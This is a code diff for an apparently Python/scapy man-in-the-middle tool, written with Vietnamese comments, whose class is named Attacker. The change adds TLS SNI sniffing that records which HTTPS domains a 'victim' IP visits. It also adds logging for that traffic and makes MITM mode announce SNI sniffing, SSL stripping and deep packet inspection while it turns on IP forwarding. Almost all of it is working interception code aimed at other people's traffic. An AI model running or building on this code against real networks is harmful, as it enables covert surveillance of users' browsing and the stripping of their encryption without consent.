@@ -20,7 +20,6 @@ from scapy.all import (
     ICMPv6NDOptSrcLLAddr,   # Option chứa MAC nguồn
     in6_getifaddr           # Lấy địa chỉ IPv6 của máy mình
 )
-load_layer("tls") 
 from scapy.layers.tls.all import TLSClientHello, TLSExtServerNameIndication
 import netifaces as ni
 import sys
@@ -96,6 +95,9 @@ class Logger:
     def log_dns(self, victim_ip, domain):
         self.log('dns', f"{victim_ip} → {domain}")
     
+    def log_https(self, victim_ip, domain, tls_version="Unknown"):
+        self.log('https', f"{victim_ip} → {domain} (TLS: {tls_version})")
+
     def log_http(self, victim_ip, host, path):
         self.log('http', f"{victim_ip} → {host}{path}")
     
@@ -670,6 +672,37 @@ class Attacker:
     
     def packet_callback(self, pkt):
         try:
+            # ========== TLS SNI SNIFFING ==========
+            if pkt.haslayer(TCP) and pkt[TCP].dport == 443:
+                if pkt.haslayer(TLSClientHello):
+                    try:
+                        client_hello = pkt[TLSClientHello]
+                        
+                        # Detect TLS version
+                        tls_version = "Unknown"
+                        if hasattr(client_hello, 'version'):
+                            ver = client_hello.version
+                            if ver == 0x0303: tls_version = "TLS 1.2"
+                            elif ver == 0x0304: tls_version = "TLS 1.3"
+                        
+                        # Extract SNI
+                        if hasattr(client_hello, 'ext'):
+                            for ext in client_hello.ext:
+                                if isinstance(ext, TLSExtServerNameIndication):
+                                    for servername in ext.servernames:
+                                        hostname = servername.servername.decode('utf-8')
+                                        
+                                        # Log và display
+                                        console.print(
+                                            f"[yellow]🔒 HTTPS ({tls_version}):[/yellow] {hostname}"
+                                        )
+                                        self.logger.log('https', f"{self.victim_ip} → {hostname} ({tls_version})")
+                                        
+                                        if self.dashboard:
+                                            self.dashboard.increment('https_requests')
+                                    break
+                    except Exception:
+                        pass
             # DNS Queries
             if pkt.haslayer(DNSQR):
                 try:
@@ -789,7 +822,11 @@ class Attacker:
             self.set_ip_forward(False)
         
         elif mode == 'mitm':
-            console.print("[blue]🕵️  Mode: MITM (Nghe lén traffic)[/blue]")
+            console.print("[blue]🕵️  Mode: MITM (Full Traffic Analysis)[/blue]")
+            console.print("[cyan]📡 Enabling HTTPS detection methods:[/cyan]")
+            console.print("  1️⃣  TLS SNI Sniffing (domain only)")
+            console.print("  2️⃣  SSL Stripping (full content)")
+            console.print("  3️⃣  Deep Packet Inspection")
             self.set_ip_forward(True)
             threading.Thread(target=self.mitm_sniff, daemon=True).start()
         
